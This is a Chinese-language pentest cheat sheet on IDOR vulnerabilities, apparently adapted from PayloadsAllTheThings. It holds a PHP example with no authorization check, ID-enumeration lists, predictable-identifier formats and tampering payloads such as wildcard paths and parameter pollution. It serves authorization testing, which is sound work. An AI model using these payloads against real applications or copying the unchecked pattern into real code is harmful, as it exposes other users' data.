# IDOR - 不安全的直接对象引用

[SEARCH_KEYWORDS]
漏洞类型: IDOR Insecure Direct Object Reference 不安全直接对象引用
攻击类型: Unauthorized Access Data Disclosure Data Manipulation Privilege Escalation
关键词: user_id id parameter object reference direct access
标识符: Numeric ID GUID UUID MongoDB ObjectId Email Username
技术: ID Enumeration Wildcard Parameter Pollution

[CONTENT]

## IDOR概述

IDOR是应用程序允许用户直接访问或修改对象(如文件、数据库记录、URL)，基于用户输入而缺乏足够访问控制时发生的安全漏洞。

## 漏洞示例

```php
<?php
    $user_id = $_GET['user_id'];
    $user_info = get_user_info($user_id);
    // 无权限检查
```

攻击：修改user_id访问其他用户数据：
```powershell
https://example.com/profile?user_id=124
```

## 标识符类型

### 数值参数

递增/递减值访问敏感信息：

```powershell
user_id=287789
user_id=287790
user_id=287791
```

### 十六进制

```powershell
0x4642d
0x4642e
```

### Unix时间戳

```powershell
1695574808
1695575098
```

### 可猜测标识符

```powershell
john
doe
john.doe
john.doe@mail.com
am9obi5kb2VAbWFpbC5jb20=  # Base64编码
```

### 弱伪随机数生成器

**UUID v1** (可预测):
```
95f6e264-bb00-11ec-8833-00155d01ef00
```

**MongoDB ObjectId** (可预测):
```
5ae9b90a2c144b9def01ec37
```
结构：4字节时间戳 + 3字节机器ID + 2字节进程ID + 3字节计数器

### 哈希参数

```powershell
MD5: 098f6bcd4621d373cade4e832627b4f6
SHA1: a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
SHA256: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
```

## 利用技术

### 通配符参数

发送通配符替代ID：

```powershell
GET /api/users/*
GET /api/users/%
GET /api/users/_
GET /api/users/.
```

### 参数污染

```powershell
user_id=hacker_id&user_id=victim_id
```

### 修改请求方法

```powershell
POST → PUT
```

### 修改内容类型

```powershell
XML → JSON
```

### 数值转数组

```json
{"id":19} → {"id":[19]}
```

## IDOR测试技巧

1. 创建两个账户测试数据隔离
2. 尝试访问其他用户资源
3. 修改所有ID参数
4. 测试不同HTTP方法
5. 检查API响应是否包含其他用户数据

## 工具

- Authz - Burp权限测试扩展
- AuthMatrix - Burp授权矩阵
- Autorize - Burp自动授权测试

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Direct Object References/README.md